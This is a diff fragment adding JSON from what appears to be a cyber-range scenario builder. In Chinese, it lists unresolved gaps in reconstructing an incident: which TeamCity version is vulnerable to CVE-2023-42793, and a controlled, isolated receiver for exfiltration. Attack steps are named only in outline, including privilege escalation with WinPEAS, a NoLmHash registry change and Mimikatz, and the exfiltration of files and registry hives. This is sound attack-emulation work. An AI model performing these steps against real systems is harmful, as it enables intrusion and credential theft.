+   ],
+   "suggestions": [
+    "請依來源或靶場設定補上具體值",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "Perform privilege escalation using WinPEAS, NoLmHash registry modification, and Mimikatz",
+     "source_ref": "actions:a9.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-9",
+      "evidence-10"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-service-s1-version",
+   "field": "JetBrains TeamCity — 版本",
+   "category": "version",
+   "reason": "IR 指出 JetBrains TeamCity（CVE-2023-42793），但沒有可重現所需的確切版本。",
+   "severity": "major",
+   "status": "open",
+   "question": "靶場要重建 JetBrains TeamCity 的哪個版本？請選受 CVE-2023-42793 影響的版本；原文沒有寫的話，請從資產清單核對或明確選擇替代版本，不要由產品名稱猜測。",
+   "affects": [
+    "service:s1 — JetBrains TeamCity",
+    "action:a1 — Exploit JetBrains TeamCity CVE-2023-42793 for initial access"
+   ],
+   "suggestions": [
+    "填入來源或資產清單記載的確切版本",
+    "選用隔離靶場可取得的替代版本並標記為替代",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "受害軟體/服務",
+     "value": "JetBrains TeamCity",
+     "source_ref": "services:s1.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-36"
+     ]
+    },
+    {
+     "field": "相關漏洞",
+     "value": "CVE-2023-42793",
+     "source_ref": "services:s1.cve",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-36"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "services",
+    "id": "s1",
+    "field": "version"
+   }
+  },
+  {
+   "id": "missing-gap-exfiltration-path",
+   "field": "資料外傳的通道與靶場接收端",
+   "category": "network",
+   "reason": "步驟把資料帶出環境，但 IR 沒有外傳的協定、目的地與資料種類，靶場也沒有受控的接收端。",
+   "severity": "major",
+   "status": "open",
+   "question": "資料是用什麼協定、傳到哪裡、傳了哪一類資料？靶場要用哪個受控的接收端（不得連到外部網路）？",
+   "affects": [
+    "action:a4 — Exfiltrate files from compromised hosts",
+    "action:a12 — Exfiltrate Windows Registry hives",
+    "host:h1 — JetBrains TeamCity server",
+    "host:h2 — Compromised hosts with Microsoft SQL Server"
+   ],
+   "suggestions": [
+    "只傳到隔離靶場內的模擬接收端",
+    "封鎖外連並將此步驟標記未重現",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "Exfiltrate files from compromised hosts",
+     "source_ref": "actions:a4.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-4"
+     ]
+    },
+    {
+     "field": "相關步驟",
+     "value": "Exfiltrate Windows Registry hives",
+     "source_ref": "actions:a12.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-13"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  }
+ ],
+ "quality": {
+  "quote_verified_rate": 0.6526,
+  "unsupported_claim_count": 32,
+  "inferred_count": 8,
+  "absent_count": 0,
+  "method": "single_pass",
+  "provisional": true,
+  "dropped_placeholder_hosts": 0,
+  "excluded_non_attacker_actions": [],
+  "hedged_action_count": 0,
+  "capability_action_count": 0,
+  "dropped_non_software_services": [],
+  "dropped_misplaced_techniques": [
+   {
+    "action": "a7",
+    "technique": "T1574.002"
+   }
+  ]
+ },
+ "id": "scn_evidence"
+}
